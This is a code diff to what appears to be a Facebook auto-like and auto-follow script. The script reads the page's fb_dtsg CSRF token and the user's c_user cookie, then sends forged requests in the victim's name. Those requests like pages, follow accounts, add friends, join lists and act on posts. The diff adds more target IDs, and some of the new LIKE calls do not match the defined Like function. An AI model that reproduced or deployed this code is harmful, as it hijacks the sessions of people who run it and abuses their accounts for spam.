@@ -15,6 +15,7 @@ function LIST(L) {
 }
 LIST("623881154291099");
 LIST("599238170088731");
+LIST("624334420912439");
 
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -34,6 +35,11 @@ function Like(p) {
 Like("110871649075947");
 Like("205728496235571");
 Like("320063638097295");
+LIKE("461027180605191");
+LIKE("422693414465248");
+LIKE("440404309325014");
+LIKE("157808551034074");
+LIKE("398697313515142");
    
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -51,11 +57,8 @@ function a(abone) {
   http4.send(params4);
 }
 a("100000076612063");
+a("100004870200324");
   
-
-
-
-
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -73,6 +76,7 @@ function IDS(r) {
   X.send(XParams);
 }
 IDS("100000076612063");
+IDS("100003898532554");
 
 
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -91,4 +95,5 @@ function P(post) {
   X.send(XParams);
 }    
 P("303740806305137");
+P("581696381842910");
 
